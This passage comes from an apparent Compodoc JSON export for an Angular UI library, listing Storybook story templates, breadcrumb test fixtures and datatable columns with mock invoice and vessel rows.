                "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: {\r\n      breadCrumbs: [\r\n        { label: 'Root', command: action('Root clicked'), segment: '' },\r\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\r\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\r\n      ],\r\n      environmentName: 'Systemtest',\r\n      homeConfig: { command: action('Home clicked') },\r\n      testEnvironment: true,\r\n      ...args\r\n    },\r\n    styles: [\r\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\r\n    ],\r\n    template: `\r\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\r\n  <div class=\"sto-header__form\">\r\n    <mat-form-field stoFormField floatLabel=\"never\">\r\n      <mat-icon matPrefix>search</mat-icon>\r\n      <input matInput placeholder=\"Search\">\r\n    </mat-form-field>\r\n  </div>\r\n</sto-app-header>\r\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\r\n`\r\n  };\r\n}"
              },
              {
                "name": "WithUserMenu",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/lib/sto-app-header/app-header.stories.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Story<StoAppHeaderComponent>",
                "defaultValue": "(args: StoAppHeaderComponent) => {\r\n  return {\r\n    props: {\r\n      breadCrumbs: [\r\n        { label: 'Root', command: action('Root clicked'), segment: '' },\r\n        { label: 'SubModule', command: action('SubModule clicked'), segment: 'submodule' },\r\n        { label: 'Third level!', command: action('Third clicked'), segment: 'third' }\r\n      ],\r\n      environmentName: 'Systemtest',\r\n      homeConfig: { command: action('Home clicked') },\r\n      testEnvironment: true,\r\n      ...args\r\n    },\r\n    styles: [\r\n      '::ng-deep body .sto-header { left: 0; width: 100% !important; }'\r\n    ],\r\n    template: `\r\n<sto-app-header [userMenu]=\"menu\" [breadCrumbs]=\"breadCrumbs\" [homeBreadCrumbConfig]=\"homeConfig\">\r\n<button mat-icon-button><mat-icon>home</mat-icon></button>\r\n</sto-app-header>\r\n<mat-menu #menu=\"matMenu\"><button mat-menu-item><mat-icon>settings</mat-icon>User Name</button></mat-menu>\r\n`\r\n  };\r\n}"
              }
            ],
            "libs/common/src/test-utils.ts": [
              {
                "name": "breadCrumbs",
                "ctype": "miscellaneous",
                "subtype": "variable",
                "file": "libs/common/src/test-utils.ts",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "Breadcrumb[]",
                "defaultValue": "[\r\n  {\r\n    label: 'One',\r\n    command: () => {\r\n      console.log('Wat?');\r\n    }\r\n  }, {\r\n    label: 'Two',\r\n    command: () => {\r\n    },\r\n    segment: '2',\r\n  },\r\n]"
              }
            ],
          "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts": [
            {
              "name": "Breadcrumbs",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "Template.bind({})"
            },
            {
              "name": "Template",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/sto-breadcrumbs/sto-breadcrumbs.stories.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Story<>",
              "defaultValue": "(args: StoBreadcrumbsComponent) => {\r\n  return {\r\n    props: args,\r\n    // template: `<sto-app-header [breadCrumbs]=\"breadCrumbs\" [environmentName]=\"environmentName\" [testEnvironment]=\"testEnvironment\"></sto-app-header>`\r\n  };\r\n}"
            }
          ],
          "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts": [
            {
              "name": "COLORS",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/common/src/lib/sto-message-panel/sto-message-panel.component.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  'primary', 'accent', 'warning', 'danger', 'success'\r\n]"
            }
          ],
          "libs/datatable/src/lib/rows.ts": [
            {
              "name": "columns",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/rows.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  {\r\n    prop: 'invoiceNo',\r\n    name: 'Invoice# (randsort)',\r\n    flexBasis: 200,\r\n    flexShrink: 1,\r\n    flexGrow: 1,\r\n    // random sort\r\n    sortFn: () => {\r\n      let n = Math.round(Math.random() * 1000);\r\n      if (n < 500) {\r\n        n = -n;\r\n      }\r\n      return n;\r\n    }\r\n  },\r\n  {\r\n    prop: 'voyageNo',\r\n    flexBasis: 200,\r\n    disableResize: true,\r\n    name: 'Voyage# (no resize)',\r\n    disableSort: true,\r\n    headerClass: 'aclass',\r\n    cellClass: () => {\r\n      return 'a-cell-class';\r\n    }\r\n  },\r\n  {\r\n    prop: 'vesselName',\r\n    flexBasis: 200,\r\n    name: 'Vessel',\r\n    headerClass: 'bclass',\r\n    flexGrow: 1\r\n  },\r\n  {\r\n    prop: 'allocated',\r\n    flexBasis: 200,\r\n    name: 'Allocated',\r\n    headerClass: 'aclass'\r\n  },\r\n  {\r\n    prop: 'total',\r\n    flexBasis: 200,\r\n    name: 'Total',\r\n    headerClass: 'aclass',\r\n    cellClass: 'a-cell-class'\r\n  }\r\n]"
            },
            {
              "name": "fixedColumns",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/rows.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[...columns.map(col => ({...col, flexGrow: 0})), ...columns.map(col => ({\r\n  ...col,\r\n  flexGrow: 0\r\n}))]"
            },
            {
              "name": "manyColumns",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/rows.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[...columns, ...columns, ...columns]"
            },
            {
              "name": "pipe",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/rows.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "new NumberFormatPipe()"
            },
            {
              "name": "rows",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/lib/rows.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "",
              "defaultValue": "[\r\n  {\r\n    'invoiceNo': 212666588,\r\n    'voyageNo': 16206,\r\n    'vesselName': 'False Cloak Fern',\r\n    'allocated': 486958,\r\n    'total': 367817\r\n}, {\r\n    'invoiceNo': 209381561,\r\n    'voyageNo': 16897,\r\n    'vesselName': 'Weak Signalgrass',\r\n    'allocated': 435757,\r\n    'total': 306822\r\n}, {\r\n    'invoiceNo': 276445387,\r\n    'voyageNo': 16723,\r\n    'vesselName': 'Southern Red Oak',\r\n    'allocated': 434782,\r\n    'total': 304761\r\n}, {\r\n    'invoiceNo': 240525031,\r\n    'voyageNo': 17412,\r\n    'vesselName': 'Hollyleaf Buckthorn',\r\n    'allocated': 498118,\r\n    'total': 518295\r\n}, {\r\n    'invoiceNo': 208251845,\r\n    'voyageNo': 15732,\r\n    'vesselName': 'Western Sandparsley',\r\n    'allocated': 483548,\r\n    'total': 409397\r\n}, {\r\n    'invoiceNo': 244864110,\r\n    'voyageNo': 15313,\r\n    'vesselName': 'Kern Buckwheat',\r\n    'allocated': 413287,\r\n    'total': 374936\r\n}, {\r\n    'invoiceNo': 213639557,\r\n    'voyageNo': 17502,\r\n    'vesselName': 'Greenleaf Manzanita',\r\n    'allocated': 478124,\r\n    'total': 362754\r\n}, {\r\n    'invoiceNo': 255930079,\r\n    'voyageNo': 15029,\r\n    'vesselName': 'Blue Skullcap',\r\n    'allocated': 464448,\r\n    'total': 483236\r\n}, {\r\n    'invoiceNo': 204028785,\r\n    'voyageNo': 17325,\r\n    'vesselName': 'Coca',\r\n    'allocated': 412084,\r\n    'total': 319574\r\n}, {\r\n    'invoiceNo': 215898267,\r\n    'voyageNo': 17556,\r\n    'vesselName': 'Fendler\\'s Pennycress',\r\n    'allocated': 467666,\r\n    'total': 401105\r\n}, {\r\n    'invoiceNo': 283652560,\r\n    'voyageNo': 16693,\r\n    'vesselName': 'Densespike Blazing Star',\r\n    'allocated': 428117,\r\n    'total': 422318\r\n}, {\r\n    'invoiceNo': 261627486,\r\n    'voyageNo': 16742,\r\n    'vesselName': 'Texas Crab Apple',\r\n    'allocated': 445829,\r\n    'total': 389401\r\n}, {\r\n    'invoiceNo': 224657257,\r\n    'voyageNo': 17344,\r\n    'vesselName': 'Philodendron',\r\n    'allocated': 439503,\r\n    'total': 197357\r\n}, {\r\n    'invoiceNo': 287799672,\r\n    'voyageNo': 18559,\r\n    'vesselName': 'Knife Acacia',\r\n    'allocated': 457225,\r\n    'total': 152586\r\n}, {\r\n    'invoiceNo': 249855102,\r\n    'voyageNo': 17210,\r\n    'vesselName': 'Catnip Noseburn',\r\n    'allocated': 490793,\r\n    'total': 295054\r\n}, {\r\n    'invoiceNo': 217932979,\r\n    'voyageNo': 18294,\r\n    'vesselName': 'Brickellbush Goldenweed',\r\n    'allocated': 476987,\r\n    'total': 90357\r\n}, {\r\n    'invoiceNo': 287187542,\r\n    'voyageNo': 18123,\r\n    'vesselName': 'Threecornerjack',\r\n    'allocated': 436103,\r\n    'total': 98431\r\n}, {\r\n    'invoiceNo': 277359566,\r\n    'voyageNo': 17549,\r\n    'vesselName': 'Longleaf Isodendrion',\r\n    'allocated': 456456,\r\n    'total': 292117\r\n}, {\r\n    'invoiceNo': 250935681,\r\n    'voyageNo': 16429,\r\n    'vesselName': 'Purple False Gilyflower',\r\n    'allocated': 465653,\r\n    'total': 396830\r\n}, {\r\n    'invoiceNo': 261927204,\r\n    'voyageNo': 16524,\r\n    'vesselName': 'Nevada Pea',\r\n    'allocated': 411190,\r\n    'total': 393332\r\n}, {\r\n    'invoiceNo': 203826163,\r\n    'voyageNo': 17608,\r\n    'vesselName': 'Alaska Tall Bluebells',\r\n    'allocated': 487745,\r\n    'total': 273514\r\n}, {\r\n    'invoiceNo': 253006185,\r\n    'voyageNo': 17795,\r\n    'vesselName': 'Cupped Monolopia',\r\n    'allocated': 491265,\r\n    'total': 117277\r\n}, {\r\n    'invoiceNo': 212369622,\r\n    'voyageNo': 17867,\r\n    'vesselName': 'Small Rocklettuce',\r\n    'allocated': 408880,\r\n    'total': 530690\r\n}, {\r\n    'invoiceNo': 259555515,\r\n    'voyageNo': 16488,\r\n    'vesselName': 'Torchwood',\r\n    'allocated': 428843,\r\n    'total': 63208\r\n}, {\r\n    'invoiceNo': 209064476,\r\n    'voyageNo': 17957,\r\n    'vesselName': 'Saline Saltbush',\r\n    'allocated': 452602,\r\n    'total': 144560\r\n}, {\r\n    'invoiceNo': 246761266,\r\n    'voyageNo': 18253,\r\n    'vesselName': 'White Snakeroot',\r\n    'allocated': 485075,\r\n    'total': 133101\r\n}, {\r\n    'invoiceNo': 277989052,\r\n    'voyageNo': 15535,\r\n    'vesselName': 'Bayberry',\r\n    'allocated': 411595,\r\n    'total': 549473\r\n}, {\r\n    'invoiceNo': 246327302,\r\n    'voyageNo': 17427,\r\n    'vesselName': 'China Violet',\r\n    'allocated': 426753,\r\n    'total': 406017\r\n}, {\r\n    'invoiceNo': 225951335,\r\n    'voyageNo': 15473,\r\n    'vesselName': 'Olympic Saxifrage',\r\n    'allocated': 429650,\r\n    'total': 413380\r\n}, {\r\n    'invoiceNo': 206579573,\r\n    'voyageNo': 17600,\r\n    'vesselName': 'False Sun-rose',\r\n    'allocated': 464983,\r\n    'total': 474611\r\n}, {\r\n    'invoiceNo': 243806520,\r\n    'voyageNo': 15148,\r\n    'vesselName': 'Bracted Lousewort',\r\n    'allocated': 486907,\r\n    'total': 419416\r\n}, {\r\n    'invoiceNo': 248037555,\r\n    'voyageNo': 16554,\r\n    'vesselName': 'Beach Strawberry',\r\n    'allocated': 446762,\r\n    'total': 543982\r\n}, {\r\n    'invoiceNo': 233807782,\r\n    'voyageNo': 18251,\r\n    'vesselName': 'Western Bog Yellowcress',\r\n    'allocated': 485749,\r\n    'total': 206612\r\n}, {\r\n    'invoiceNo': 231399318,\r\n    'voyageNo': 18647,\r\n    'vesselName': 'Nevada Pea',\r\n    'allocated': 416624,\r\n    'total': 73797\r\n}, {\r\n    'invoiceNo': 210265421,\r\n    'voyageNo': 17334,\r\n    'vesselName': 'Silver Bird\\'s-foot Trefoil',\r\n    'allocated': 493556,\r\n    'total': 485404\r\n}, {\r\n    'invoiceNo': 270110020,\r\n    'voyageNo': 15750,\r\n    'vesselName': 'Dotted Lancepod',\r\n    'allocated': 439009,\r\n    'total': 85163\r\n}, {\r\n    'invoiceNo': 203365491,\r\n    'voyageNo': 15574,\r\n    'vesselName': 'Arizona Whitefeather',\r\n    'allocated': 424981,\r\n    'total': 72976\r\n}, {\r\n    'invoiceNo': 258026382,\r\n    'voyageNo': 17991,\r\n    'vesselName': 'Rough Blackfoot',\r\n    'allocated': 412805,\r\n    'total': 525915\r\n}, {\r\n    'invoiceNo': 216800989,\r\n    'voyageNo': 18938,\r\n    'vesselName': 'Narrowleaf Wirelettuce',\r\n    'allocated': 437679,\r\n    'total': 384426\r\n}, {\r\n    'invoiceNo': 224161270,\r\n    'voyageNo': 15475,\r\n    'vesselName': 'Utah Sweetvetch',\r\n    'allocated': 414735,\r\n    'total': 398700\r\n}, {\r\n    'invoiceNo': 224587536,\r\n    'voyageNo': 16133,\r\n    'vesselName': 'Palau Horsfieldia',\r\n    'allocated': 409836,\r\n    'total': 55599\r\n}, {\r\n    'invoiceNo': 200019644,\r\n    'voyageNo': 16430,\r\n    'vesselName': 'Cracked Lichen',\r\n    'allocated': 491135,\r\n    'total': 400179\r\n}, {\r\n    'invoiceNo': 212973644,\r\n    'voyageNo': 16527,\r\n    'vesselName': 'California Valerian',\r\n    'allocated': 465742,\r\n    'total': 428281\r\n}, {\r\n    'invoiceNo': 236726871,\r\n    'voyageNo': 15145,\r\n    'vesselName': 'Spear Saltbush',\r\n    'allocated': 420067,\r\n    'total': 236753\r\n}, {\r\n    'invoiceNo': 262498296,\r\n    'voyageNo': 16350,\r\n    'vesselName': 'Rose Globemallow',\r\n    'allocated': 472387,\r\n    'total': 270655\r\n}, {\r\n    'invoiceNo': 237959767,\r\n    'voyageNo': 18739,\r\n    'vesselName': 'Cithara Buckwheat',\r\n    'allocated': 447466,\r\n    'total': 358262\r\n}, {\r\n    'invoiceNo': 200461954,\r\n    'voyageNo': 18921,\r\n    'vesselName': 'Rough Potato',\r\n    'allocated': 425594,\r\n    'total': 459497\r\n}, {\r\n    'invoiceNo': 266033549,\r\n    'voyageNo': 16150,\r\n    'vesselName': 'Distictis',\r\n    'allocated': 447636,\r\n    'total': 286350\r\n}, {\r\n    'invoiceNo': 289893009,\r\n    'voyageNo': 18219,\r\n    'vesselName': 'Piedmont False Pimpernel',\r\n    'allocated': 474098,\r\n    'total': 163688\r\n}, {\r\n    'invoiceNo': 241320630,\r\n    'voyageNo': 15558,\r\n    'vesselName': 'Southern Mexican Sage',\r\n    'allocated': 431537,\r\n    'total': 419734\r\n}, {\r\n    'invoiceNo': 211404482,\r\n    'voyageNo': 18502,\r\n    'vesselName': 'Bearded Sprangletop',\r\n    'allocated': 458939,\r\n    'total': 89714\r\n}, {\r\n    'invoiceNo': 247917426,\r\n    'voyageNo': 18238,\r\n    'vesselName': 'Small-flowered Calycadenia',\r\n    'allocated': 406198,\r\n    'total': 351785\r\n}, {\r\n    'invoiceNo': 234633032,\r\n    'voyageNo': 17269,\r\n    'vesselName': 'Pritchardia',\r\n    'allocated': 442188,\r\n    'total': 414638\r\n}, {\r\n    'invoiceNo': 216477974,\r\n    'voyageNo': 15454,\r\n    'vesselName': 'Thread Lichen',\r\n    'allocated': 474232,\r\n    'total': 537142\r\n}, {\r\n    'invoiceNo': 201667786,\r\n    'voyageNo': 15130,\r\n    'vesselName': 'Margined Stickseed',\r\n    'allocated': 493253,\r\n    'total': 364145\r\n}, {\r\n    'invoiceNo': 271891491,\r\n    'voyageNo': 15468,\r\n    'vesselName': 'Eggleaf Milkwort',\r\n    'allocated': 457747,\r\n    'total': 316780\r\n}, {\r\n    'invoiceNo': 223744528,\r\n    'voyageNo': 16074,\r\n    'vesselName': 'Hall\\'s Mule-ears',\r\n    'allocated': 439241,\r\n    'total': 301239\r\n}, {\r\n    'invoiceNo': 202936481,\r\n    'voyageNo': 18868,\r\n    'vesselName': 'Rinodina Lichen',\r\n    'allocated': 488291,\r\n    'total': 504547\r\n}, {\r\n    'invoiceNo': 284610720,\r\n    'voyageNo': 17077,\r\n    'vesselName': 'Saber Bogmat',\r\n    'allocated': 417817,\r\n    'total': 246511\r\n}, {\r\n    'invoiceNo': 286535852,\r\n    'voyageNo': 15935,\r\n    'vesselName': 'Brodiaea',\r\n    'allocated': 479989,\r\n    'total': 276206\r\n}, {\r\n    'invoiceNo': 206000446,\r\n    'voyageNo': 17528,\r\n    'vesselName': 'Utah Serviceberry',\r\n    'allocated': 454837,\r\n    'total': 399887\r\n}, {\r\n    'invoiceNo': 283036494,\r\n    'voyageNo': 16899,\r\n    'vesselName': 'Lehua Makanoe',\r\n    'allocated': 452547,\r\n    'total': 96023\r\n}, {\r\n    'invoiceNo': 270371913,\r\n    'voyageNo': 16886,\r\n    'vesselName': 'Rim Lichen',\r\n    'allocated': 439082,\r\n    'total': 269557\r\n}, {\r\n    'invoiceNo': 273513209,\r\n    'voyageNo': 15570,\r\n    'vesselName': 'Andrews\\' Rhizomnium Moss',\r\n    'allocated': 471494,\r\n    'total': 131750\r\n}, {\r\n    'invoiceNo': 215244773,\r\n    'voyageNo': 17618,\r\n    'vesselName': 'Lesser Pond Sedge',\r\n    'allocated': 472422,\r\n    'total': 505921\r\n}, {\r\n    'invoiceNo': 264815411,\r\n    'voyageNo': 17008,\r\n    'vesselName': 'Browne\\'s Savory',\r\n    'allocated': 464834,\r\n    'total': 420180\r\n}, {\r\n    'invoiceNo': 260793904,\r\n    'voyageNo': 18868,\r\n    'vesselName': 'Bastard Copperleaf',\r\n    'allocated': 403983,\r\n    'total': 190831\r\n}, {\r\n    'invoiceNo': 228919503,\r\n    'voyageNo': 16736,\r\n    'vesselName': 'Himalayan Cypress',\r\n    'allocated': 418664,\r\n    'total': 450233\r\n}, {\r\n    'invoiceNo': 225534860,\r\n    'voyageNo': 18374,\r\n    'vesselName': 'Fiddleleaf Hawksbeard',\r\n    'allocated': 495477,\r\n    'total': 528500\r\n}, {\r\n    'invoiceNo': 205039289,\r\n    'voyageNo': 15221,\r\n    'vesselName': 'Maui Cyanea',\r\n    'allocated': 434081,\r\n    'total': 79021\r\n}, {\r\n    'invoiceNo': 219730920,\r\n    'voyageNo': 18931,\r\n    'vesselName': 'Garden Sorrel',\r\n    'allocated': 442584,\r\n    'total': 193166\r\n}, {\r\n    'invoiceNo': 229994865,\r\n    'voyageNo': 16404,\r\n    'vesselName': 'Waialeale Dubautia',\r\n    'allocated': 414377,\r\n    'total': 195495\r\n}, {\r\n    'invoiceNo': 289807557,\r\n    'voyageNo': 16151,\r\n    'vesselName': 'Onetooth Woodfern',\r\n    'allocated': 415673,\r\n    'total': 202974\r\n}, {\r\n    'invoiceNo': 289750833,\r\n    'voyageNo': 15827,\r\n    'vesselName': 'Greenland Orange Lichen',\r\n    'allocated': 416432,\r\n    'total': 146021\r\n}, {\r\n    'invoiceNo': 243948439,\r\n    'voyageNo': 18154,\r\n    'vesselName': 'Leafy Reedgrass',\r\n    'allocated': 441439,\r\n    'total': 248631\r\n}, {\r\n    'invoiceNo': 266718010,\r\n    'voyageNo': 15322,\r\n    'vesselName': 'Largeleaf Marshpennywort',\r\n    'allocated': 436736,\r\n    'total': 256997\r\n}, {\r\n    'invoiceNo': 285338933,\r\n    'voyageNo': 18884,\r\n    'vesselName': 'Musk Okra',\r\n    'allocated': 414918,\r\n    'total': 475276\r\n}, {\r\n    'invoiceNo': 284544908,\r\n    'voyageNo': 16825,\r\n    'vesselName': 'Stegonia Moss',\r\n    'allocated': 486396,\r\n    'total': 210718\r\n}, {\r\n    'invoiceNo': 200951860,\r\n    'voyageNo': 15681,\r\n    'vesselName': 'Black Rock Townsend Daisy',\r\n    'allocated': 437133,\r\n    'total': 358340\r\n}, {\r\n    'invoiceNo': 248838992,\r\n    'voyageNo': 18254,\r\n    'vesselName': 'Kern Canyon Clarkia',\r\n    'allocated': 414245,\r\n    'total': 164454\r\n}, {\r\n    'invoiceNo': 274109340,\r\n    'voyageNo': 18252,\r\n    'vesselName': 'Squarrose Knapweed',\r\n    'allocated': 408814,\r\n    'total': 159690\r\n}, {\r\n    'invoiceNo': 219721177,\r\n    'voyageNo': 16331,\r\n    'vesselName': 'Lake County Dwarf-flax',\r\n    'allocated': 496150,\r\n    'total': 404922\r\n}, {\r\n    'invoiceNo': 272212685,\r\n    'voyageNo': 15395,\r\n    'vesselName': 'Ferngrass',\r\n    'allocated': 432853,\r\n    'total': 191127\r\n}, {\r\n    'invoiceNo': 243182762,\r\n    'voyageNo': 18321,\r\n    'vesselName': 'Marsh Grass',\r\n    'allocated': 462472,\r\n    'total': 452940\r\n}, {\r\n    'invoiceNo': 277839539,\r\n    'voyageNo': 17421,\r\n    'vesselName': 'Prairie Straw Sedge',\r\n    'allocated': 406837,\r\n    'total': 271284\r\n}, {\r\n    'invoiceNo': 207952597,\r\n    'voyageNo': 17197,\r\n    'vesselName': 'Doublehorn Calicoflower',\r\n    'allocated': 477735,\r\n    'total': 400959\r\n}, {\r\n    'invoiceNo': 260636315,\r\n    'voyageNo': 15453,\r\n    'vesselName': 'Palmer\\'s Goldenrod',\r\n    'allocated': 450419,\r\n    'total': 309897\r\n}, {\r\n    'invoiceNo': 256449906,\r\n    'voyageNo': 15189,\r\n    'vesselName': 'Oregon Checkerbloom',\r\n    'allocated': 435139,\r\n    'total': 139814\r\n}, {\r\n    'invoiceNo': 230023430,\r\n    'voyageNo': 15665,\r\n    'vesselName': 'Duckweed',\r\n    'allocated': 449282,\r\n    'total': 209512\r\n}, {\r\n    'invoiceNo': 226217229,\r\n    'voyageNo': 18462,\r\n    'vesselName': 'Disc Lichen',\r\n    'allocated': 471214,\r\n    'total': 58962\r\n}, {\r\n    'invoiceNo': 239201753,\r\n    'voyageNo': 18676,\r\n    'vesselName': 'Antifever Fontinalis Moss',\r\n    'allocated': 456585,\r\n    'total': 146024\r\n}, {\r\n    'invoiceNo': 235303844,\r\n    'voyageNo': 16223,\r\n    'vesselName': 'Miracle Fruit',\r\n    'allocated': 467877,\r\n    'total': 150931\r\n}, {\r\n    'invoiceNo': 217943418,\r\n    'voyageNo': 15418,\r\n    'vesselName': 'Little Gumweed',\r\n    'allocated': 494402,\r\n    'total': 355363\r\n}, {\r\n    'invoiceNo': 289788898,\r\n    'voyageNo': 15038,\r\n    'vesselName': 'Parish\\'s Oxytheca',\r\n    'allocated': 464853,\r\n    'total': 472823\r\n}, {\r\n    'invoiceNo': 280499130,\r\n    'voyageNo': 18914,\r\n    'vesselName': 'Jelly Lichen',\r\n    'allocated': 486477,\r\n    'total': 522679\r\n}, {\r\n    'invoiceNo': 223812339,\r\n    'voyageNo': 18298,\r\n    'vesselName': 'Evermann\\'s Fleabane',\r\n    'allocated': 453418,\r\n    'total': 50034\r\n}, {\r\n    'invoiceNo': 226331833,\r\n    'voyageNo': 17046,\r\n    'vesselName': 'Munj Sweetcane',\r\n    'allocated': 442239,\r\n    'total': 447072\r\n}, {\r\n    'invoiceNo': 226842057,\r\n    'voyageNo': 16491,\r\n    'vesselName': 'Trichostomum Moss',\r\n    'allocated': 450732,\r\n    'total': 471203\r\n}, {\r\n    'invoiceNo': 218377093,\r\n    'voyageNo': 18157,\r\n    'vesselName': 'Brown Stringybark',\r\n    'allocated': 441668,\r\n    'total': 464837\r\n}, {\r\n    'invoiceNo': 282690677,\r\n    'voyageNo': 16864,\r\n    'vesselName': 'Whorled Milkwort',\r\n    'allocated': 424456,\r\n    'total': 241177\r\n  }]\r\n  .map(row => ({...row, total: pipe.transform(row.total)}))"
            }
          ],
          "libs/datatable/src/testing/utils.ts": [
            {
              "name": "columns",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/testing/utils.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "Column[]",
              "defaultValue": "[\r\n  { prop: 'invoiceNo', name: 'invoiceNo', },\r\n  { prop: 'voyageNo', name: 'voyageNo', },\r\n  { prop: 'vesselName', name: 'vesselName', },\r\n  { prop: 'allocated', name: 'allocated', },\r\n  { prop: 'total', name: 'total' },\r\n]"
            },
            {
              "name": "rows",
              "ctype": "miscellaneous",
              "subtype": "variable",
              "file": "libs/datatable/src/testing/utils.ts",
              "deprecated": false,
              "deprecationMessage": "",
              "type": "[]",
              "defaultValue": "[\r\n  {\r\n    invoiceNo: 212666588,\r\n    voyageNo: 16206,\r\n    vesselName: 'False Cloak Fern',\r\n    allocated: 486958,\r\n    total: 367817\r\n  }, {\r\n    invoiceNo: 209381561,\r\n    voyageNo: 16897,\r\n    vesselName: 'Weak Signalgrass',\r\n    allocated: 435757,\r\n    total: 306822\r\n  }, {\r\n    invoiceNo: 276445387,\r\n    voyageNo: 16723,\r\n    vesselName: 'Southern Red Oak',\r\n    allocated: 434782,\r\n    total: 304761\r\n  }, {\r\n    invoiceNo: 240525031,\r\n    voyageNo: 17412,\r\n    vesselName: 'Hollyleaf Buckthorn',\r\n    allocated: 498118,\r\n    total: 518295\r\n  }, {\r\n    invoiceNo: 208251845,\r\n    voyageNo: 15732,\r\n    vesselName: 'Western Sandparsley',\r\n    allocated: 483548,\r\n    total: 409397\r\n  }, {\r\n    invoiceNo: 244864110,\r\n    voyageNo: 15313,\r\n    vesselName: 'Kern Buckwheat',\r\n    allocated: 413287,\r\n    total: 374936\r\n  }, {\r\n    invoiceNo: 213639557,\r\n    voyageNo: 17502,\r\n    vesselName: 'Greenleaf Manzanita',\r\n    allocated: 478124,\r\n    total: 362754\r\n  }, {\r\n    invoiceNo: 255930079,\r\n    voyageNo: 15029,\r\n    vesselName: 'Blue Skullcap',\r\n    allocated: 464448,\r\n    total: 483236\r\n  }, {\r\n    invoiceNo: 204028785,\r\n    voyageNo: 17325,\r\n    vesselName: 'Coca',\r\n    allocated: 412084,\r\n    total: 319574\r\n  }, {\r\n    invoiceNo: 215898267,\r\n    voyageNo: 17556,\r\n    vesselName: 'Fendler\\'s Pennycress',\r\n    allocated: 467666,\r\n    total: 401105\r\n  }, {\r\n    invoiceNo: 283652560,\r\n    voyageNo: 16693,\r\n    vesselName: 'Densespike Blazing Star',\r\n    allocated: 428117,\r\n    total: 422318\r\n  }, {\r\n    invoiceNo: 261627486,\r\n    voyageNo: 16742,\r\n    vesselName: 'Texas Crab Apple',\r\n    allocated: 445829,\r\n    total: 389401\r\n  }, {\r\n    invoiceNo: 224657257,\r\n    voyageNo: 17344,\r\n    vesselName: 'Philodendron',\r\n    allocated: 439503,\r\n    total: 197357\r\n  }, {\r\n    invoiceNo: 287799672,\r\n    voyageNo: 18559,\r\n    vesselName: 'Knife Acacia',\r\n    allocated: 457225,\r\n    total: 152586\r\n  }, {\r\n    invoiceNo: 249855102,\r\n    voyageNo: 17210,\r\n    vesselName: 'Catnip Noseburn',\r\n    allocated: 490793,\r\n    total: 295054\r\n  }, {\r\n    invoiceNo: 217932979,\r\n    voyageNo: 18294,\r\n    vesselName: 'Brickellbush Goldenweed',\r\n    allocated: 476987,\r\n    total: 90357\r\n  }, {\r\n    invoiceNo: 287187542,\r\n    voyageNo: 18123,\r\n    vesselName: 'Threecornerjack',\r\n    allocated: 436103,\r\n    total: 98431\r\n  }, {\r\n    invoiceNo: 277359566,\r\n    voyageNo: 17549,\r\n    vesselName: 'Longleaf Isodendrion',\r\n    allocated: 456456,\r\n    total: 292117\r\n  }, {\r\n    invoiceNo: 250935681,\r\n    voyageNo: 16429,\r\n    vesselName: 'Purple False Gilyflower',\r\n    allocated: 465653,\r\n    total: 396830\r\n  }, {\r\n    invoiceNo: 261927204,\r\n    voyageNo: 16524,\r\n    vesselName: 'Nevada Pea',\r\n    allocated: 411190,\r\n    total: 393332\r\n  }, {\r\n    invoiceNo: 203826163,\r\n    voyageNo: 17608,\r\n    vesselName: 'Alaska Tall Bluebells',\r\n    allocated: 487745,\r\n    total: 273514\r\n  }, {\r\n    invoiceNo: 253006185,\r\n    voyageNo: 17795,\r\n    vesselName: 'Cupped Monolopia',\r\n    allocated: 491265,\r\n    total: 117277\r\n  }, {\r\n    invoiceNo: 212369622,\r\n    voyageNo: 17867,\r\n    vesselName: 'Small Rocklettuce',\r\n    allocated: 408880,\r\n    total: 530690\r\n  }, {\r\n    invoiceNo: 259555515,\r\n    voyageNo: 16488,\r\n    vesselName: 'Torchwood',\r\n    allocated: 428843,\r\n    total: 63208\r\n  }, {\r\n    invoiceNo: 209064476,\r\n    voyageNo: 17957,\r\n    vesselName: 'Saline Saltbush',\r\n    allocated: 452602,\r\n    total: 144560\r\n  }, {\r\n    invoiceNo: 246761266,\r\n    voyageNo: 18253,\r\n    vesselName: 'White Snakeroot',\r\n    allocated: 485075,\r\n    total: 133101\r\n  }, {\r\n    invoiceNo: 277989052,\r\n    voyageNo: 15535,\r\n    vesselName: 'Bayberry',\r\n    allocated: 411595,\r\n    total: 549473\r\n  }, {\r\n    invoiceNo: 246327302,\r\n    voyageNo: 17427,\r\n    vesselName: 'China Violet',\r\n    allocated: 426753,\r\n    total: 406017\r\n  }, {\r\n    invoiceNo: 